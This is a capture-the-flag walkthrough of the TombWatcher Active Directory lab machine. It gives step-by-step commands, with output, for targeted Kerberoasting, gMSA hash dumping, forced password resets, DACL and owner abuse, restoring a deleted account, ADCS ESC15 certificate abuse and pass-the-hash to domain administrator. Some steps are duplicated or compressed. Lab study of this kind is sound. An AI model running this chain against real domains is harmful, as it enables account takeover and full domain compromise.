#box #AD #WriteSPN #AddSelf #ReadGMSAPassword #ForceChangePassword #WriteOwner #impacket-owneredit #GenericAll #OU #Restore-ADObject #bloodyAD #certipy #Kerberoasting #gMSADumper
1. The machine present an assumed breach scenario with the user `henry:H3nry_987TGV!`. After trying ASREPRoast and Kerberoast we opt to user `bloodhound-python` to download the AD structure
```sh
bloodhound-python -u 'Henry' -p 'H3nry_987TGV!' -ns 10.129.6.90 -d tombwatcher.htb -c all
```
2. Opening the structure and after setting `Henry` as owned, when clicking on the `Shortest paths from Owned objects` in Bloodhound we discover there's a pretty straight forward composed by a few hops as shown below. There are 6 steps that can lead us to the OU (Organization Unit) `ADCS`
![[attachments/tombwatcher-1.png]]
3. `WriteSPN` from `Henry` to `Alfred`, this can be done by using `targetedKerberoast`
```sh
targetedKerberoast -v -d 'tombwatcher.htb' -u 'henry' -p 'H3nry_987TGV!'
```

>If we get KRB_AP_ERR_SKEW(Clock skew too great) we can repair the clock on our side by aligning it with the target machine `sudo ntpdate tombwatcher.htb`

4. We can now finally crack the tgs hash and obtain the password for the user `Alfred:basketball`
```sh
hashcat hash.txt /usr/share/wordlists/rockyou.txt
```
5. `AddSelf` from `Alfred` to `Infrastructure`, to do so we could use `net rpc group addmem` but we couldn't manage to make it work so we shifted onto `bloodyAD`
```sh
bloodyAD --host dc01.tombwatcher.htb -d "tombwatcher.htb" -u "Alfred" -p "basketball" add groupMember "Infrastructure" "Alfred"

[+] Alfred added to Infrastructure
```
6. Now that `Alfred` belongs to `Infrastructure` we can use `gMSADumper` to dump the hash of the `ansible_dev$` user:
```sh
python3 gMSADumper.py -u 'Alfred' -p 'basketball' -d 'tombwatcher.htb'

Users or groups who can read password for ansible_dev$:
 > Infrastructure
ansible_dev$:::838b2bd83fbe39901be3713e8c79ce37
ansible_dev$:aes256-cts-hmac-sha1-96:ff4958690b93555ac86b891dd493b58a65b934af0817adcd2526c1c8197d2a8a
ansible_dev$:aes128-cts-hmac-sha1-96:c8424c8cb9663db1a27df605ac8a507b
```
6. Dumped the hash of `ansible_dev$` we can now perform a `ForceChangePassword` attack over `Sam`. To do so we'll use `pth-net` since we only have the hash of the `ansible_dev$` user. As suggested on bloodhound, since we do not have the LM hash we'll replace it with `ffffffffffffffffffffffffffffffff`
```sh
pth-net rpc password "sam" "basketball" -U "TOMBWATCHER.HTB"/"ansible_dev$"%"ffffffffffffffffffffffffffffffff":"838b2bd83fbe39901be3713e8c79ce37" -S "DC01.TOMBWATCHER.HTB"
```

>The log is not particularly exhaustive, but we can try to authenticate with  `sam:basketball` in smb to prove that the password change occurred
>![[attachments/tombwatcher-2.png]]

7. Once changed the password of the user `Sam` we can leverage the `WriteOwner` privilege to take control over the `john` user. After some tries with the recommended tools, we could only find the change to become `owner` of the `john` user as `sam`
```sh
bloodyAD --host 10.129.6.90 -d tombwatcher.htb -u 'sam' -p 'basketball' set owner john sam

[+] Old owner S-1-5-21-1392491010-1358638721-2126982587-512 is now replaced by sam on john
```
or, alternatively

```sh
impacket-owneredit -action write -new-owner 'sam' -target 'john' 'tombwatcher.htb'/'sam':'basketball'

Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Current owner information below
[*] - SID: S-1-5-21-1392491010-1358638721-2126982587-1105
[*] - sAMAccountName: sam
[*] - distinguishedName: CN=sam,CN=Users,DC=tombwatcher,DC=htb
[*] OwnerSid modified successfully!
```
8. Once changed the owner of `john` we can now use `impacket-dacledit`:
```sh
impacket-dacledit -action 'write' -rights 'FullControl' -principal 'sam' -target 'john' 'tombwatcher.htb'/'sam':'basketball'

Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] DACL backed up to dacledit-20260320-182918.bak
[*] DACL modified successfully!
```
9. We can now change the user's password within `rpcclient`
```sh
rpcclient -U "TOMBWATCHER/sam"%"basketball" 10.129.6.90 -c "setuserinfo2 john 23 basketball"
```
10. The last hop is to leverage the `GenericAll` right over the OU `ADCS`. As mentioned below by bloodhound, taking control of an OU permits us to set a new ACE that will be inherited by all the objects below that OU
```sh
impacket-dacledit -action 'write' -rights 'FullControl' -inheritance -principal 'John' -target-dn 'OU=ADCS,DC=TOMBWATCHER,DC=HTB' 'tombwatcher.htb'/'john':'basketball'

Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] NB: objects with adminCount=1 will no inherit ACEs from their parent container/OU
[*] DACL backed up to dacledit-20260320-183630.bak
[*] DACL modified successfully!
```
11. In the case above we gave to `john` the privilege `FullControl` over the OU, making `john` gain `FullControl` over all the children of that OU
```sh
impacket-dacledit -action 'write' -rights 'FullControl' -inheritance -principal 'John' -target-dn 'OU=ADCS,DC=TOMBWATCHER,DC=HTB' 'tombwatcher.htb'/'john':'basketball'
```
12. Here the step was too steep and we weren't able to proceed. We opted to look for a brand new set of techniques we weren't aware of. Following https://0xdf.gitlab.io/2025/10/11/htb-tombwatcher.html#auth-as-cert_admin guide. First of all he discovered through `certipy` that there was a suspicious unresolved SID in its scan:
```sh
certipy-ad find -target dc01.tombwatcher.htb -u john -p basketball
```
![[attachments/tombwatcher-3.png]]
13. Then he figured out that this object wasn't being returned neither on the Windows system by using `Get-ADObject`
```sh
Get-ADObject -Identity "S-1-5-21-1392491010-1358638721-2126982587-1111"
```
![[attachments/tombwatcher-4.png]]
14. At this point he looked for potentially deleted SIDs since that one wasn't being resolved, discovering this unresolved SID referred to an user called `cert_admin`
```sh
Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects -property objectSid,lastKnownParent
```
![[attachments/tombwatcher-5.png]]
15. Then he restored this deleted item with `Restore-ADObject` using the `ObjectGUID`
```sh
Restore-ADObject -Identity 938182c3-bf0b-410a-9aaa-45c8e1a02ebf
```
16. At this point he retrieves `cert_admin` with `Get-ADObject`
```sh
Get-ADUser cert_admin
```
![[attachments/tombwatcher-6.png]]
17. Since we have GenericAll over the whole OU we can now reset the password of `cert_admin` with:
```sh
net rpc password "cert_admin" "basketball" -U "TOMBWATCHER"/"john"%"basketball" -S "dc01.tombwatcher.htb"
```
and validate it works with `nxc`
![[attachments/tombwatcher-7.png]]
18. Once obtained control of `cert_admin` we can run again `certipy-ad` to enumerate for vulnerabilities while controlling this new user and, this time, a vulnerability comes out:
```sh
certipy-ad find -target dc01.tombwatcher.htb -u cert_admin -p 'basketball' -vulnerable -stdout
```

![[attachments/tombwatcher-8.png]]
19. At this point we can leverage the following escalation technique explained here https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu
```sh
certipy-ad req -u cert_admin -p 'basketball' -dc-ip 10.129.232.167 -target dc01.tombwatcher.htb -ca tombwatcher-CA-1 -template WebServer -upn administrator@tombwatcher.htb -application-policies 'Certificate Request Agent'
```

![[attachments/tombwatcher-9.png]]
20. Once obtained the certificate we can keep following the guide and obtain the NTLM Hash of the DC Admin
```sh
certipy-ad auth -pfx 'administrator.pfx' -dc-ip 10.129.232.167
```
![[attachments/tombwatcher-10.png]]
21. Finally, we can authenticate as DC Admin through evil-winrm
```sh
evil-winrm -i dc01.tombwatcher.htb -u 'administrator' -H 'f61db423bebe3328d33af26741afe5fc'
```
